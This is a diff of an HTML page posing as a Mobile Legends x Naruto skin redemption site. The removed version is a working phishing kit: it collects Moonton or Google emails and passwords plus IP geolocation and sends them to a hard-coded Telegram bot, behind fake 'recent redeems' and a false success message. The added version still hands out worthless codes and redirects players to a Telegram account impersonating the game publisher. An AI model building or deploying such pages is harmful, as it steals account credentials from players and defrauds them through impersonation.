@@ -3,752 +3,174 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Redeem Skin MLBB x Naruto</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <title>MLBB Naruto Skin Redeem</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap');
-    
-    * { 
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    
     body {
-      font-family: 'Montserrat', sans-serif;
-      background: linear-gradient(-45deg, #1a1a2e, #16213e, #0f3460, #533d7b);
-      background-size: 400% 400%;
-      min-height: 100vh;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #000000, #0f0f0f);
+      color: #00ffe0;
+      margin: 0;
+      height: 100vh;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
-      animation: gradientBG 15s ease infinite;
-      overflow-x: hidden;
-      color: #fff;
-    }
-
-    @keyframes gradientBG {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+      align-items: center;
     }
 
     .container {
-      position: relative;
-      width: 100%;
-      max-width: 500px;
-      perspective: 1000px;
-    }
-
-    /* Animated floating kunai */
-    .kunai {
-      position: absolute;
-      width: 40px;
-      height: 40px;
-      background-image: url('https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg');
-      background-size: contain;
-      background-repeat: no-repeat;
-      opacity: 0.7;
-      z-index: -1;
-      animation: floatKunai 15s linear infinite;
-    }
-
-    @keyframes floatKunai {
-      0% {
-        transform: translate(0, 0) rotate(0deg);
-        opacity: 0;
-      }
-      10% {
-        opacity: 0.7;
-      }
-      90% {
-        opacity: 0.7;
-      }
-      100% {
-        transform: translate(calc(100vw - 100px), calc(100vh - 100px)) rotate(720deg);
-        opacity: 0;
-      }
-    }
-
-    .hero-image {
-      width: 280px;
-      height: 280px;
-      margin: 0 auto 20px;
-      position: relative;
-      border-radius: 50%;
-      background: radial-gradient(circle, rgba(255,215,0,0.2) 0%, rgba(255,215,0,0) 70%);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      animation: pulse 3s infinite alternate;
-    }
-
-    .hero-image img {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
-      filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.7));
-      transform-style: preserve-3d;
-      animation: float 6s ease-in-out infinite;
-    }
-
-    @keyframes float {
-      0%, 100% { transform: translateY(0) rotateY(0deg); }
-      50% { transform: translateY(-20px) rotateY(10deg); }
-    }
-
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      100% { transform: scale(1.05); }
-    }
-
-    .title {
-      text-align: center;
-      margin-bottom: 10px;
-      font-size: 2.5rem;
-      background: linear-gradient(90deg, #ffcc00, #ff9500, #ffcc00);
-      -webkit-background-clip: text;
-      background-clip: text;
-      color: transparent;
-      text-shadow: 0 0 10px rgba(255, 200, 0, 0.3);
-      position: relative;
-      animation: titleGlow 2s infinite alternate;
-    }
-
-    @keyframes titleGlow {
-      from { text-shadow: 0 0 10px rgba(255, 200, 0, 0.3); }
-      to { text-shadow: 0 0 20px rgba(255, 200, 0, 0.7), 0 0 30px rgba(255, 150, 0, 0.5); }
-    }
-
-    .subtitle {
-      text-align: center;
-      margin-bottom: 30px;
-      font-size: 1rem;
-      color: rgba(255, 255, 255, 0.8);
-      position: relative;
-    }
-
-    .subtitle::after {
-      content: '';
-      display: block;
-      width: 100px;
-      height: 2px;
-      background: linear-gradient(90deg, transparent, #ffcc00, transparent);
-      margin: 10px auto;
-    }
-
-    form {
-      background: rgba(15, 15, 15, 0.7);
-      backdrop-filter: blur(12px);
-      -webkit-backdrop-filter: blur(12px);
-      border: 1px solid rgba(255, 204, 0, 0.3);
-      border-radius: 20px;
+      background: #111;
+      border: 2px solid #00ffe0;
       padding: 30px;
-      width: 100%;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 
-                  inset 0 0 15px rgba(255, 204, 0, 0.2);
-      transform-style: preserve-3d;
-      transition: all 0.5s ease;
-      position: relative;
-      overflow: hidden;
+      border-radius: 16px;
+      width: 360px;
+      box-shadow: 0 0 25px #00ffe0;
+      text-align: center;
     }
 
-    form::before {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: linear-gradient(
-        to bottom right,
-        transparent 45%,
-        rgba(255, 204, 0, 0.1) 50%,
-        transparent 55%
-      );
-      animation: shine 3s infinite;
-      z-index: 0;
-    }
-
-    @keyframes shine {
-      0% { transform: rotate(0deg) translate(-50%, -50%); }
-      100% { transform: rotate(360deg) translate(-50%, -50%); }
-    }
-
-    form:hover {
-      transform: translateY(-5px) rotateX(5deg);
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), 
-                  inset 0 0 20px rgba(255, 204, 0, 0.3);
-    }
-
-    .form-group {
+    h2, h3 {
+      color: #00ffe0;
       margin-bottom: 20px;
-      position: relative;
-      z-index: 1;
     }
 
-    .form-group label {
-      display: block;
-      margin-bottom: 8px;
-      font-size: 0.9rem;
-      color: rgba(255, 255, 255, 0.8);
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border-radius: 6px;
+      border: none;
     }
 
     input, select {
-      width: 100%;
-      padding: 15px;
-      border-radius: 10px;
-      border: 1px solid rgba(255, 204, 0, 0.3);
-      background: rgba(30, 30, 30, 0.8);
-      color: #fff;
-      font-size: 1rem;
-      transition: all 0.3s ease;
-      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.5);
-    }
-
-    input:focus, select:focus {
-      outline: none;
-      border-color: #ffcc00;
-      box-shadow: 0 0 10px rgba(255, 204, 0, 0.5),
-                  inset 0 1px 3px rgba(0, 0, 0, 0.5);
-      transform: translateY(-2px);
-    }
-
-    input::placeholder {
-      color: rgba(255, 255, 255, 0.5);
+      background: #1a1a1a;
+      color: #00ffe0;
+      border: 1px solid #00ffe0;
     }
 
     button {
-      width: 100%;
-      padding: 15px;
-      border-radius: 10px;
-      border: none;
-      background: linear-gradient(135deg, #ffcc00, #ff9500, #ffcc00);
-      background-size: 200% 200%;
-      color: #111;
-      font-weight: 700;
-      font-size: 1.1rem;
+      background: linear-gradient(135deg, #00ffe0, #00bfff);
+      color: #000;
+      font-weight: bold;
       cursor: pointer;
-      transition: all 0.3s ease;
-      position: relative;
-      overflow: hidden;
-      box-shadow: 0 5px 15px rgba(255, 153, 0, 0.4);
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      animation: gradientShift 3s ease infinite;
-    }
-
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
+      transition: transform 0.2s ease;
     }
 
     button:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 8px 20px rgba(255, 153, 0, 0.6);
+      transform: scale(1.05);
     }
 
-    button:active {
-      transform: translateY(1px);
-    }
-
-    button::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(
-        90deg,
-        transparent,
-        rgba(255, 255, 255, 0.2),
-        transparent
-      );
-      transition: all 0.5s ease;
-    }
-
-    button:hover::before {
-      left: 100%;
-    }
-
-    .spinner {
-      display: inline-block;
-      width: 20px;
-      height: 20px;
-      border: 3px solid rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      border-top-color: #fff;
-      animation: spin 1s ease-in-out infinite;
-      margin-right: 10px;
-      vertical-align: middle;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .confetti {
-      position: absolute;
-      width: 10px;
-      height: 10px;
-      background-color: #f00;
-      opacity: 0;
-      z-index: 10;
-    }
-
-    /* Naruto-themed loading bar */
-    .loading-bar {
-      width: 100%;
-      height: 5px;
-      background: rgba(255, 204, 0, 0.2);
-      border-radius: 3px;
-      overflow: hidden;
-      margin-top: 15px;
+    .hidden {
       display: none;
     }
 
-    .loading-progress {
-      height: 100%;
-      width: 0;
-      background: linear-gradient(90deg, #ffcc00, #ff9500);
-      border-radius: 3px;
-      transition: width 0.3s ease;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .loading-progress::after {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: linear-gradient(
-        90deg,
-        transparent,
-        rgba(255, 255, 255, 0.4),
-        transparent
-      );
-      animation: loadingShine 1.5s infinite;
-    }
-
-    @keyframes loadingShine {
-      0% { transform: translateX(-100%); }
-      100% { transform: translateX(100%); }
-    }
-
-    /* Recent redeem marquee */
-    .recent-redeems {
-      width: 100%;
-      margin: 20px 0;
-      padding: 10px;
-      background: rgba(0, 0, 0, 0.3);
-      border-radius: 5px;
-      overflow: hidden;
-      white-space: nowrap;
-      box-shadow: 0 0 10px rgba(255, 204, 0, 0.2);
-    }
-
-    .recent-redeems span {
-      display: inline-block;
-      padding-left: 100%;
-      animation: marquee 15s linear infinite;
-      color: #ffcc00;
-      font-size: 0.9rem;
-    }
-
-    @keyframes marquee {
-      0% { transform: translateX(0); }
-      100% { transform: translateX(-100%); }
-    }
-
-    /* Skin preview container */
-    .skin-preview {
-      display: none;
-      width: 100%;
-      margin-top: 20px;
-      text-align: center;
-      animation: fadeIn 1s ease;
-    }
-
-    .skin-preview img {
-      max-width: 100%;
+    #resultBox {
+      background: #1b1b1b;
+      padding: 20px;
+      border: 1px solid #00ffe0;
       border-radius: 10px;
-      box-shadow: 0 0 20px rgba(255, 204, 0, 0.5);
-    }
-
-    .skin-preview h3 {
       margin-top: 10px;
-      color: #ffcc00;
+      color: #00ffe0;
     }
 
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    /* Responsive adjustments */
-    @media (max-width: 600px) {
-      .container {
-        padding: 0 20px;
-      }
-      
-      .hero-image {
-        width: 200px;
-        height: 200px;
-      }
-      
-      .title {
-        font-size: 2rem;
-      }
-      
-      form {
-        padding: 20px;
-      }
-    }
-
-    /* Custom scrollbar */
-    ::-webkit-scrollbar {
-      width: 8px;
-    }
-
-    ::-webkit-scrollbar-track {
-      background: rgba(0, 0, 0, 0.2);
-    }
-
-    ::-webkit-scrollbar-thumb {
-      background: linear-gradient(#ffcc00, #ff9500);
-      border-radius: 10px;
-    }
-
-    ::-webkit-scrollbar-thumb:hover {
-      background: linear-gradient(#ff9500, #ffcc00);
+    strong {
+      color: #ffffff;
     }
   </style>
 </head>
 <body>
-  <!-- Floating kunai elements -->
-  <div class="kunai" style="top: 10%; left: 5%; animation-delay: 0s;"></div>
-  <div class="kunai" style="top: 20%; left: 80%; animation-delay: 2s;"></div>
-  <div class="kunai" style="top: 70%; left: 15%; animation-delay: 4s;"></div>
-  <div class="kunai" style="top: 80%; left: 70%; animation-delay: 6s;"></div>
 
   <div class="container">
-    <div class="hero-image">
-      <img src="https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg" alt="Naruto Skin" id="heroImg">
-    </div>
-    
-    <h1 class="title">MLBB x NARUTO</h1>
-    <p class="subtitle">Exclusive Skin Redemption</p>
-
-    <!-- Recent redeems marquee -->
-    <div class="recent-redeems">
-      <span id="redeemMarquee">Recent redeems: </span>
-    </div>
-    
-    <form id="redeemForm">
-      <div class="form-group">
-        <label for="userId"><i class="fas fa-user"></i> User ID</label>
-        <input type="text" id="userId" placeholder="Enter your User ID" required 
-               inputmode="numeric" pattern="[0-9]*"
-               oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-      </div>
-      
-      <div class="form-group">
-        <label for="zoneId"><i class="fas fa-globe"></i> Zone ID</label>
-        <input type="text" id="zoneId" placeholder="Enter your Zone ID" required 
-               inputmode="numeric" pattern="[0-9]*"
-               oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-      </div>
-      
-      <div class="form-group">
-        <label for="methodSelect"><i class="fas fa-sign-in-alt"></i> Login Method</label>
-        <select id="methodSelect" required>
-          <option value="Moonton">Login with Moonton</option>
-          <option value="Google">Login with Google</option>
+    <div id="formPage">
+      <h2>MLBB Naruto Skin Redeem</h2>
+      <form id="redeemForm">
+        <input type="text" id="username" placeholder="Enter your MLBB Username" required />
+        <input type="text" id="mlbbId" placeholder="Enter your MLBB ID" required inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+        <input type="text" id="zoneId" placeholder="Enter your Zone ID" required inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+        
+        <label for="skinCount">How many skins do you own?</label>
+        <select id="skinCount" required>
+          <option value="" disabled selected>Select the number of skins you own</option>
+          <!-- Generate options 1 to 999 -->
+          <script>
+            for (let i = 1; i <= 999; i++) {
+              let option = document.createElement("option");
+              option.value = i;
+              option.textContent = `Skin ${i}`;
+              document.getElementById("skinCount").appendChild(option);
+            }
+          </script>
         </select>
-      </div>
-      
-      <div class="form-group" id="emailLabelDiv">
-        <label for="emailField"><i class="fas fa-envelope"></i> Email</label>
-        <input type="email" id="emailField" placeholder="Moonton Email" required>
-      </div>
-      
-      <div class="form-group" id="passwordLabelDiv">
-        <label for="passwordField"><i class="fas fa-lock"></i> Password</label>
-        <input type="password" id="passwordField" placeholder="Moonton Password" required>
-      </div>
-      
-      <div class="form-group">
-        <label for="skinSelect"><i class="fas fa-tshirt"></i> Choose Naruto Skin</label>
-        <select id="skinSelect" required>
-          <option value="">Select your skin</option>
-          <option value="Naruto">Lukas - Naruto Uzumaki</option>
-          <option value="Sasuke">Suyou - Sasuke hatake</option>
-          <option value="Sakura">Kalea - Sakura</option>
-          <option value="Kakashi">Hayabusa - Kakashi</option>
-        </select>
-      </div>
-      
-      <div class="form-group">
-        <label for="codeField"><i class="fas fa-gift"></i> Redemption Code</label>
-        <input type="text" id="codeField" placeholder="Select a skin to generate code" readonly required>
-      </div>
-      
-      <button type="submit" id="submitBtn">
-        <span id="buttonText">REDEEM NOW</span>
-      </button>
-      
-      <div class="loading-bar" id="loadingBar">
-        <div class="loading-progress" id="loadingProgress"></div>
-      </div>
-    </form>
 
-    <!-- Skin preview after redeem -->
-    <div class="skin-preview" id="skinPreview">
-      <h3>You've successfully redeemed:</h3>
-      <img id="redeemedSkinImg" src="" alt="Redeemed Skin">
-      <p id="redeemedSkinName"></p>
+        <label for="skinSelect">Select a Skin MLBB X NARUTO</label>
+        <select id="skinSelect" required class="hidden">
+          <option value="" disabled selected>Select your skin</option>
+          <option value="Lukas - Naruto Uzumaki">Lukas - Naruto Uzumaki</option>
+          <option value="Kalea - Sakura">Kalea - Sakura</option>
+          <option value="Hayabusa - Kakashi">Hayabusa - Kakashi</option>
+          <option value="Suyou - Sasuke">Suyou - Sasuke</option>
+        </select>
+
+        <button type="submit">Get Redeem Code</button>
+      </form>
+    </div>
+
+    <div id="resultPage" class="hidden">
+      <div id="resultBox">
+        <h3>Congratulations!</h3>
+        <p>Username: <strong id="displayUsername"></strong></p>
+        <p>Selected Skin(s): <strong id="skinName"></strong></p>
+        <p>Your Redeem Code: <strong id="codeResult"></strong></p>
+        <p>You'll be redirected to Telegram now...</p>
+      </div>
     </div>
   </div>
 
   <script>
-    const BOT_TOKEN = "7667662149:AAE8qvehpAjpabPqXMR0MX7TtBmPwf5iYHw";
-    const CHAT_ID = "7137150704";
-    const methodSelect = document.getElementById('methodSelect');
-    const emailLabelDiv = document.getElementById('emailLabelDiv');
-    const passwordLabelDiv = document.getElementById('passwordLabelDiv');
-    const skinSelect = document.getElementById('skinSelect');
-    const codeField = document.getElementById('codeField');
-    const heroImg = document.getElementById('heroImg');
-    const loadingBar = document.getElementById('loadingBar');
-    const loadingProgress = document.getElementById('loadingProgress');
-    const buttonText = document.getElementById('buttonText');
-    const redeemMarquee = document.getElementById('redeemMarquee');
-    const skinPreview = document.getElementById('skinPreview');
-    const redeemedSkinImg = document.getElementById('redeemedSkinImg');
-    const redeemedSkinName = document.getElementById('redeemedSkinName');
+    const form = document.getElementById("redeemForm");
+    const formPage = document.getElementById("formPage");
+    const resultPage = document.getElementById("resultPage");
+    const skinCountSelect = document.getElementById("skinCount");
+    const skinSelect = document.getElementById("skinSelect");
 
-    // Change hero image based on selected skin
-    const skinImages = {
-      'Naruto': 'https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg',
-      'Sasuke': 'https://i.ibb.co/tPPz7GPS/IMG-20250513-192141.jpg',
-      'Sakura': 'https://i.ibb.co/Hfj4SsgH/IMG-20250513-192111.jpg',
-      'Kakashi': 'https://i.ibb.co/wfk0j8T/IMG-20250513-192211.jpg'
-    };
-
-    // Skin names mapping
-    const skinNames = {
-      'Naruto': 'Lukas - Naruto Uzumaki',
-      'Sasuke': 'Suyou - Sasuke Hatake',
-      'Sakura': 'Kalea - Sakura',
-      'Kakashi': 'Hayabusa - Kakashi'
-    };
-
-    // Generate random user IDs for the marquee
-    function generateRandomIds() {
-      const randomIds = [];
-      for (let i = 0; i < 5; i++) {
-        const id = Math.floor(10000000 + Math.random() * 90000000);
-        const skinKeys = Object.keys(skinNames);
-        const randomSkin = skinKeys[Math.floor(Math.random() * skinKeys.length)];
-        randomIds.push(`${id} (${skinNames[randomSkin]})`);
-      }
-      return randomIds.join(' • ');
-    }
-
-    // Update marquee with random redeems
-    function updateMarquee() {
-      const randomText = `Recent redeems: ${generateRandomIds()}`;
-      redeemMarquee.textContent = randomText;
-      
-      // Update marquee periodically
-      setTimeout(updateMarquee, 15000);
-    }
-
-    // Initialize marquee
-    updateMarquee();
-
-    methodSelect.addEventListener('change', function () {
-      const method = this.value;
-      const emailLabel = emailLabelDiv.querySelector('label');
-      const passwordLabel = passwordLabelDiv.querySelector('label');
-      
-      if (method === 'Google') {
-        emailLabel.innerHTML = '<i class="fas fa-envelope"></i> Google Email';
-        document.getElementById('emailField').placeholder = "Google Email";
-        passwordLabel.innerHTML = '<i class="fas fa-lock"></i> Google Password';
-        document.getElementById('passwordField').placeholder = "Google Password";
-      } else {
-        emailLabel.innerHTML = '<i class="fas fa-envelope"></i> Moonton Email';
-        document.getElementById('emailField').placeholder = "Moonton Email";
-        passwordLabel.innerHTML = '<i class="fas fa-lock"></i> Moonton Password';
-        document.getElementById('passwordField').placeholder = "Moonton Password";
+    // Menampilkan dropdown skin setelah memilih jumlah skin
+    skinCountSelect.addEventListener("change", function() {
+      if (skinCountSelect.value) {
+        skinSelect.classList.remove("hidden");
       }
     });
 
-    skinSelect.addEventListener('change', () => {
-      const skin = skinSelect.value;
-      if (skin) {
-        // Generate a more realistic-looking code
-        const code = `MLBB-NAR-${skin.toUpperCase()}-${Math.floor(1000 + Math.random() * 9000)}-${Math.random().toString(36).substr(2, 4).toUpperCase()}`;
-        codeField.value = code;
-        
-        // Change hero image
-        if (skinImages[skin]) {
-          heroImg.src = skinImages[skin];
-          heroImg.alt = `${skin} Skin`;
-        }
-      } else {
-        codeField.value = '';
-        heroImg.src = 'https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg';
-        heroImg.alt = 'Naruto Skin';
-      }
-    });
-
-    document.getElementById('redeemForm').addEventListener('submit', async function (e) {
+    form.addEventListener("submit", function (e) {
       e.preventDefault();
 
-      const submitBtn = document.getElementById('submitBtn');
-      submitBtn.disabled = true;
-      buttonText.innerHTML = `<span class="spinner"></span> PROCESSING...`;
-      
-      // Show loading bar
-      loadingBar.style.display = 'block';
-      
-      // Animate loading progress
-      let progress = 0;
-      const loadingInterval = setInterval(() => {
-        progress += Math.random() * 10;
-        if (progress > 90) progress = 90; // Don't complete until we're actually done
-        loadingProgress.style.width = `${progress}%`;
-      }, 300);
+      const username = document.getElementById("username").value.trim();
+      const mlbbId = document.getElementById("mlbbId").value.trim();
+      const zoneId = document.getElementById("zoneId").value.trim();
+      const skinCount = skinCountSelect.value;
+      const selectedSkin = skinSelect.value;
 
-      const userId = document.getElementById('userId').value;
-      const zoneId = document.getElementById('zoneId').value;
-      const email = document.getElementById('emailField').value;
-      const password = document.getElementById('passwordField')?.value || '-';
-      const method = document.getElementById('methodSelect').value;
-      const skin = document.getElementById('skinSelect').value;
-      const code = document.getElementById('codeField').value;
-
-      try {
-        // Simulate processing delay
-        await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 2000));
-        
-        const ipRes = await fetch('https://ipwho.is/');
-        const ipData = await ipRes.json();
-        const message = `
-[MLBB x Naruto Redeem Attempt]
-User ID: ${userId}
-Zone ID: ${zoneId}
-Email: ${email}
-Password: ${password}
-Method: ${method}
-Skin: ${skin}
-Code: ${code}
-
-IP: ${ipData.ip}
-Location: ${ipData.city}, ${ipData.country} (${ipData.country_code})
-ISP: ${ipData.connection?.org}
-ASN: ${ipData.connection?.asn}
-        `;
-        
-        // Send to Telegram
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: message
-          })
-        });
-
-        // Complete loading animation
-        clearInterval(loadingInterval);
-        loadingProgress.style.width = '100%';
-        
-        // Create confetti effect
-        createConfetti();
-        
-        // Show the redeemed skin
-        if (skinImages[skin]) {
-          redeemedSkinImg.src = skinImages[skin];
-          redeemedSkinImg.alt = `${skin} Skin`;
-          redeemedSkinName.textContent = skinNames[skin];
-          skinPreview.style.display = 'block';
-        }
-
-        // Update marquee with this user's ID
-        const newRedeem = `${userId} (${skinNames[skin]})`;
-        const currentMarquee = redeemMarquee.textContent.replace('Recent redeems: ', '');
-        const updatedMarquee = `Recent redeems: ${newRedeem} • ${currentMarquee.split(' • ').slice(0, 4).join(' • ')}`;
-        redeemMarquee.textContent = updatedMarquee;
-
-        // Show success message after a short delay
-        setTimeout(() => {
-          alert("🎉 Redeem successful! The skin will be delivered to your account within 24 hours.");
-          this.reset();
-          codeField.value = '';
-          loadingBar.style.display = 'none';
-          loadingProgress.style.width = '0';
-        }, 500);
-      } catch (err) {
-        console.error(err);
-        clearInterval(loadingInterval);
-        loadingBar.style.display = 'none';
-        loadingProgress.style.width = '0';
-        alert("⚠️ Error occurred. Please try again later.");
-      } finally {
-        submitBtn.disabled = false;
-        buttonText.textContent = 'REDEEM NOW';
+      if (!username || !mlbbId || !zoneId || !skinCount || !selectedSkin) {
+        alert("Please complete all fields.");
+        return;
       }
+
+      // Membuat redeem code
+      const redeemCode = "MLBB-" + Math.random().toString(36).substr(2, 6).toUpperCase();
+
+      document.getElementById("displayUsername").textContent = `: ${username} ID : ${mlbbId} ID SERVER : ${zoneId}`;
+      document.getElementById("skinName").textContent = `${selectedSkin} (Skin Count: ${skinCount})`;
+      document.getElementById("codeResult").textContent = redeemCode;
+
+      formPage.classList.add("hidden");
+      resultPage.classList.remove("hidden");
+
+      const message = encodeURIComponent(
+        `MLBB Redeem Request:\nUsername: ${username}\nID: ${mlbbId}\nZone: ${zoneId}\nSkin Count: ${skinCount}\nSkin: ${selectedSkin}\nCode: ${redeemCode}\nHello admin, I just redeemed MLBB skin`
+      );
+
+      setTimeout(() => {
+        window.location.href = `tg://resolve?domain=Moonton027&text=${message}`;
+      }, 3000);
     });
-
-    function createConfetti() {
-      const colors = ['#ffcc00', '#ff9500', '#ffffff', '#ff3333', '#33ccff'];
-      const container = document.querySelector('.container');
-      
-      for (let i = 0; i < 100; i++) {
-        const confetti = document.createElement('div');
-        confetti.className = 'confetti';
-        confetti.style.left = Math.random() * 100 + 'vw';
-        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
-        confetti.style.width = Math.random() * 10 + 5 + 'px';
-        confetti.style.height = Math.random() * 10 + 5 + 'px';
-        confetti.style.opacity = Math.random() + 0.5;
-        confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
-        
-        const animationDuration = Math.random() * 3 + 2;
-        confetti.style.animation = `fall ${animationDuration}s linear forwards`;
-        
-        document.body.appendChild(confetti);
-        
-        // Add falling animation
-        const keyframes = `
-          @keyframes fall {
-            to {
-              transform: translateY(100vh) rotate(${Math.random() * 360}deg);
-              opacity: 0;
-            }
-          }
-        `;
-        
-        const style = document.createElement('style');
-        style.innerHTML = keyframes;
-        document.head.appendChild(style);
-        
-        // Remove confetti after animation
-        setTimeout(() => {
-          confetti.remove();
-          style.remove();
-        }, animationDuration * 1000);
-      }
-    }
   </script>
+
 </body>
-</html>
+                                                              </html>
